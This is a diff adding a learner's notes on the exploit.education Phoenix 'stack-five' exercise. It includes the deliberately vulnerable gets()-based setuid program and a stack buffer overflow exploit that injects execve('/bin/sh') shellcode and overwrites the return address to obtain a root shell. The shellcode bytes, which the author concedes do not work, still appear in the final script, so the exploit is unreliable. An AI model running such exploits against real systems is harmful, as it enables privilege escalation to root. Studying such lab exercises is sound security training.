@@ -1,0 +1,139 @@
+/*
+ * phoenix/stack-five, by https://exploit.education
+ *
+ * Can you execve("/bin/sh", ...) ?
+ *
+ * What is green and goes to summer camp? A brussel scout.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+char *gets(char *);
+
+void start_level() {
+  char buffer[128];
+  gets(buffer);
+}
+
+int main(int argc, char **argv) {
+  printf("%s\n", BANNER);
+  start_level();
+}
+
+
+// We want to execute /bin/shell. Because the executable has the setuid bit set, it executes as root. When it finishes it drops privileges, but if we start a shell it will be as root
+
+//Our program to start a shell:
+
+#include <stdio.h>
+#include <unistd.h>
+int main(void) {
+  printf("Main program started\n");
+  char* argv[] = { NULL };
+  char* envp[] = { NULL };
+  if (execve("/bin/sh", argv, envp) == -1)
+      perror("Could not execve");
+  return 1;
+}
+
+// TEST:
+//Would it work with?
+#include <unistd.h>
+int main(void) {
+  execve("/bin/sh", NULL, NULL);
+  return 1;
+}
+
+// After solving: it is not so easy, my shellcode from compiled C doesn't work as it calls to the GOT and other things that C adds,
+// For this exercise it is better to get the shellcode from the web, in the future we will practice how to write our own shellcode.
+// we compile and translate it to opcodes (shellcode)
+
+0000000000001040 <main>:
+
+    1040:	48 83 ec 08          	sub    $0x8,%rsp
+    1044:	31 d2                	xor    %edx,%edx
+    1046:	48 8d 3d b7 0f 00 00 	lea    0xfb7(%rip),%rdi        # 2004 <_IO_stdin_used+0x4>
+    104d:	31 f6                	xor    %esi,%esi
+    104f:	e8 dc ff ff ff       	callq  1030 <execve@plt>
+
+// We only need until here
+
+    1054:	b8 01 00 00 00       	mov    $0x1,%eax
+    1059:	48 83 c4 08          	add    $0x8,%rsp
+    105d:	c3                   	retq   
+    105e:	66 90                	xchg   %ax,%ax
+
+4883ec0831d2488d3db70f000031f6e8dcffffff
+
+20  bytes
+
+Our code:
+
+chr(0x48) + chr(0x83) + chr(0xec) + chr(0x08) + chr(0x31) + chr(0xd2) + chr(0x48) + chr(0x8d) + chr(0x3d) + chr(0xb7) + chr(0x0f) + chr(0x00) + chr(0x00) + chr(0x31) + chr(0xf6) + chr(0xe8) + chr(0xdc) + chr(0xff) + chr(0xff) + chr(0xff)
+
+// don't need + chr(0xb8) + chr(0x01) + chr(0x00) + chr(0x00) + chr(0x00) + chr(0x48) + chr(0x83) + chr(0xc4) + chr(0x08) + chr(0xc3) + chr(0x66) + chr(0x90) + 
+
+We need to place it at buffer and we need to place the address 
+
+0x00000000004005a4 <+0>:	push   rbp
+0x00000000004005a5 <+1>:	mov    rbp,rsp
+0x00000000004005a8 <+4>:	sub    rsp,0x10
+
+0x00000000004005ac <+8>:	mov    DWORD PTR [rbp-0x4],edi
+0x00000000004005af <+11>:	mov    QWORD PTR [rbp-0x10],rsi
+
+0x00000000004005b3 <+15>:	mov    edi,0x400620
+0x00000000004005b8 <+20>:	call   0x400400 <puts@plt>
+0x00000000004005bd <+25>:	mov    eax,0x0
+
+0x00000000004005c2 <+30>:	call   0x40058d <start_level>
+0x00000000004005c7 <+35>:	mov    eax,0x0
+
+0x00000000004005cc <+40>:	leave  
+0x00000000004005cd <+41>:	ret
+
+Start level:
+
+0x000000000040058d <+0>:	push   rbp
+0x000000000040058e <+1>:	mov    rbp,rsp
+0x0000000000400591 <+4>:	add    rsp,0xffffffffffffff80
+
+0x0000000000400595 <+8>:	lea    rax,[rbp-0x80]
+0x0000000000400599 <+12>:	mov    rdi,rax
+0x000000000040059c <+15>:	call   0x4003f0 <gets@plt>
+0x00000000004005a1 <+20>:	nop
+0x00000000004005a2 <+21>:	leave  
+0x00000000004005a3 <+22>:	ret
+
+
+We need to find where the return address is saved:
+0x4005c2 + 0x8 is the return address
+
+We are saving the buffer at:
+rbp-0x80 = 
+From gdb:
+rbp-0x80 = 0x7fffffffe500
+
+chr(0x00)
+chr(0xe5)
+chr(0xff)
+chr(0xff)
+chr(0xff)
+chr(0x7f)
+
+Python script:
+
+payload_address = chr(0x00) + chr(0xe5) + chr(0xff) + chr(0xff) + chr(0xff) + chr(0x7f)
+
+payload = chr(0x48) + chr(0x83) + chr(0xec) + chr(0x08) + chr(0x31) + chr(0xd2) + chr(0x48) + chr(0x8d) + chr(0x3d) + chr(0xb7) + chr(0x0f) + chr(0x00) + chr(0x00) + chr(0x31) + chr(0xf6) + chr(0xe8) + chr(0xdc) + chr(0xff) + chr(0xff) + chr(0xff)
+
+base_pointer_length = 0x8 # bytes
+padding_from_payload_to_return_address = 'a'*(128 - len(payload) + base_pointer_length)
+
+print(payload + padding_from_payload_to_return_address + payload_address)
